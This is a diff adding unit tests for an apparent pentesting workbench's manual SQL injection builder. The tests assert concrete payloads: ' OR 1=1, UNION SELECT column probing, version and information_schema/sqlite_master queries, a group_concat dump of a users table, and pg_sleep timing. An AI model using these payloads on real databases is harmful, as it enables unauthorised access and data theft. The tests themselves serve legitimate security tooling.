@@ -122,5 +122,36 @@ ok(/gobuster dir -u http:\/\/10\.10\.10\.5\//.test(W.wordlistCmd('dirs', '/wl.tx
 ok(W.wordlistCmd('dirs', '/wl.txt').indexOf('<target>') >= 0, 'sample command shows <target> when none is set');
 ok(/-x php/.test(W.wordlistCmd('dirs', '/wl.txt', 't', 'php')), 'an extension is threaded into the dirs command');
 
+// ── manual SQLi builder ──────────────────────────────────────────────────────────────────────
+ok(W.sqliDbmsList().length >= 4, 'SQLi covers the common engines (' + W.sqliDbmsList().length + ')');
+function phase(state, key) { return W.sqliBuild(state).phases.filter(function (p) { return p.key === key; })[0]; }
+function payloads(state, key) { var p = phase(state, key); return p ? p.items.map(function (i) { return i.payload; }) : []; }
+
+// string context starts every payload with a quote; numeric does not
+ok(payloads({ dbms: 'mysql', ctx: 'string' }, 'detect')[1] === "' OR 1=1-- -", 'MySQL string true payload');
+ok(payloads({ dbms: 'mysql', ctx: 'numeric' }, 'detect')[1] === ' OR 1=1-- -', 'numeric context drops the quote');
+ok(payloads({ dbms: 'mssql', ctx: 'string' }, 'detect')[1] === "' OR 1=1-- ", 'MSSQL uses the -- comment');
+
+// progressive disclosure: no UNION-visible phase until cols is set
+ok(!phase({ dbms: 'mysql', ctx: 'string' }, 'vis'), 'no visible-column phase before column count');
+ok(phase({ dbms: 'mysql', ctx: 'string', cols: 3 }, 'vis'), 'visible-column phase appears once cols is set');
+ok(payloads({ dbms: 'mysql', ctx: 'string', cols: 3 }, 'vis')[0] === "' UNION SELECT 1,2,3-- -", 'UNION lists all columns');
+
+// info phase places the expression at the visible column only
+const info = payloads({ dbms: 'mysql', ctx: 'string', cols: 3, vis: 2 }, 'info')[0];
+ok(info === "' UNION SELECT 1,@@version,3-- -", 'version goes in the visible column, others stay numbered');
+ok(!phase({ dbms: 'mysql', ctx: 'string', cols: 3 }, 'info'), 'no info phase until a visible column is chosen');
+
+// tables phase pulls names; columns/dump only after a table is chosen
+ok(/information_schema\.tables WHERE table_schema=database\(\)/.test(payloads({ dbms: 'mysql', ctx: 'string', cols: 2, vis: 1 }, 'tables')[0]), 'MySQL tables query targets the current database');
+ok(!phase({ dbms: 'mysql', ctx: 'string', cols: 2, vis: 1 }, 'columns'), 'no columns phase without a table');
+ok(phase({ dbms: 'mysql', ctx: 'string', cols: 2, vis: 1, table: 'users' }, 'dump'), 'dump phase appears with a table');
+ok(/group_concat/.test(payloads({ dbms: 'mysql', ctx: 'string', cols: 2, vis: 1, table: 'users' }, 'dump')[0]), 'MySQL dump uses group_concat');
+
+// postgres / sqlite specifics
+ok(/pg_sleep/.test(payloads({ dbms: 'postgres', ctx: 'string' }, 'detect').join(' ')), 'PostgreSQL offers pg_sleep time-based');
+ok(/sqlite_master/.test(payloads({ dbms: 'sqlite', ctx: 'string', cols: 2, vis: 1 }, 'tables')[0]), 'SQLite lists from sqlite_master');
+ok(W.SQLI_DBMS.sqlite.time === null, 'SQLite has no time-based payload (correctly omitted)');
+
 console.log(fail ? ('\nWORKBENCH: ' + fail + ' FAILURES') : '\nWORKBENCH: all passed');
 process.exit(fail ? 1 : 0);
